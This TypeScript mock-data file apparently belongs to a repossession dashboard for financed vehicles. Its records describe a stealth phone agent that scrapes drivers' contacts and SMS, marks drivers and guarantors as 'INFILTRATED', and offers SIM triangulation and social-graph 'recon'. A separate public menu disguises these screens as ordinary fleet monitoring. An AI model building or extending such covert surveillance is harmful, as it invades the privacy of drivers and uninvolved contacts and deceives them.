
import { AssetStatus, Vehicle, SignalSource, TamperStatus, AuditReport } from './types';

export const MOCK_VEHICLES: Vehicle[] = [
  {
    id: '1',
    plate: 'KCA 450X',
    imei: '86445903-4412-998',
    phone: '+234 801 234 5678',
    nin: '54409923110',
    model: 'Toyota Prius 2018',
    driverName: 'Abiola Johnson',
    status: AssetStatus.INFILTRATED,
    tamperStatus: TamperStatus.SECURE,
    lastPing: '2 mins ago',
    lat: 6.5244,
    lng: 3.3792,
    paymentScore: 92,
    batteryLevel: 84,
    orgId: 'org1',
    accuracy: 5,
    source: SignalSource.SHADOW_APP,
    unlockedFeatures: {
      gpsTracking: true,
      simTriangulation: false,
      socialGraph: false,
      forensicReports: false,
      policeDispatch: false
    },
    background: {
      ninStatus: 'VERIFIED',
      loanDefaulter: false,
      registryHits: 0,
      socialMediaScore: 88,
      simAgeDays: 1240,
      riskAssessment: 'Clean profile. High stability predicted.'
    },
    agent: {
      version: 'v4.2-stealth',
      isStealth: true,
      permissions: ['Contacts', 'SMS', 'Location'],
      batteryDrain: '0.12%',
      lastSync: 'Now',
      scrapedContacts: [
        { name: 'Mama Shade', phone: '+234 701 992 1100', callFrequency: 42, lastContact: '1h ago', isTrackable: true },
        { name: 'Mechanic Lekki', phone: '+234 805 112 0044', callFrequency: 12, lastContact: '2d ago', isTrackable: false }
      ]
    },
    m2m: {
      iccid: '892340001299384',
      carrier: 'MTN NG (M2M)',
      signalDbm: -72,
      dataUsage: '14.2 MB',
      ipAddress: '10.22.45.101',
      isESIM: true
    },
    guarantors: [
      { name: 'Alice Doe', phone: '+254 722 000 111', relationship: 'Spouse', status: 'INFILTRATED' },
      { name: 'Bob Smith', phone: '+254 722 000 222', relationship: 'Employer', status: 'FORM_PENDING' }
    ]
  },
  {
    id: '2',
    plate: 'GGE 112 YT',
    imei: '35892105-1109-221',
    phone: '+234 902 888 1122',
    nin: '11002293844',
    model: 'Honda Insight 2020',
    driverName: 'Sunday Okoro',
    status: AssetStatus.SIM_ONLY,
    tamperStatus: TamperStatus.SIM_REMOVED,
    // Fix: Added missing lastPing property to satisfy Vehicle interface requirements
    lastPing: '14 hours ago',
    lat: 6.5400,
    lng: 3.3900,
    paymentScore: 15,
    batteryLevel: 12,
    orgId: 'org1',
    accuracy: 850,
    source: SignalSource.CARRIER_SIM,
    unlockedFeatures: {
      gpsTracking: true,
      simTriangulation: false,
      socialGraph: false,
      forensicReports: false,
      policeDispatch: false
    },
    background: {
      ninStatus: 'VERIFIED',
      loanDefaulter: true,
      registryHits: 2,
      socialMediaScore: 12,
      simAgeDays: 4,
      riskAssessment: 'CRITICAL: New SIM card and existing loan defaults.'
    },
    m2m: {
      iccid: '892340001299999',
      carrier: 'Airtel NG (Roaming)',
      signalDbm: -115,
      dataUsage: '2.1 MB',
      ipAddress: '10.22.45.205',
      isESIM: false
    },
    guarantors: [
      { name: 'Mark Okoro', phone: '+254 700 333 444', relationship: 'Father', status: 'INFILTRATED' }
    ]
  }
];

export const MOCK_REPORTS: AuditReport[] = [
  {
    id: 'REP-001',
    timestamp: '2024-05-20 10:30',
    assetPlate: 'KCA 450X',
    operator: 'GHOST-UNIT-01',
    action: 'GEO_LANDMARK_VERIFY',
    finding: 'Visual match confirmed for Surulere Stadium. 92% confidence.',
    hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
  }
];

export const MOCK_ORGS = [
  { id: 'org1', name: 'Lekki Logistics', subscription: 'Enterprise', credits: '12,500', activeAssets: 145 },
];

export const NAV_ITEMS = [
  { id: 'dashboard', label: 'Intel Overview', icon: 'M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6' },
  { id: 'tracking', label: 'Tactical Map', icon: 'M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z' },
  { id: 'registry', label: 'Asset Enrollment', icon: 'M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z' },
  { id: 'police', label: 'Police Command', icon: 'M10 2a1 1 0 011 1v1.323l3.954 1.582 1.599-.8a1 1 0 01.894 1.79l-1.233.616 1.738 5.42a1 1 0 01-.285 1.05l-3.294 2.712 1.154 5.77a1 1 0 01-1.472 1.065L10 16.12l-3.03 2.507a1 1 0 01-1.472-1.065l1.154-5.77-3.294-2.712a1 1 0 01-.285-1.05l1.738-5.42-1.233-.616a1 1 0 11.894-1.79l1.599.8L9 4.323V3a1 1 0 011-1z' },
  { id: 'intel', label: 'Background Recon', icon: 'M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z' },
  { id: 'recovery', label: 'Tactical Recovery', icon: 'M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z' },
  { id: 'reports', label: 'Forensic Audit', icon: 'M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4' },
  { id: 'billing', label: 'SaaS Billing', icon: 'M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z' },
];

export const PUBLIC_NAV_ITEMS = [
  { id: 'dashboard', label: 'Fleet Monitoring', icon: 'M9 17V7m0 10a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h2a2 2 0 012 2m0 10a2 2 0 002 2h2a2 2 0 002-2M9 7a2 2 0 012-2h2a2 2 0 012 2m0 10V7m0 10a2 2 0 002 2h2a2 2 0 002-2V7a2 2 0 00-2-2h-2a2 2 0 00-2 2' },
  { id: 'registry', label: 'Employee Portal', icon: 'M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z' },
  { id: 'billing', label: 'Subscription & Credits', icon: 'M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z' },
];
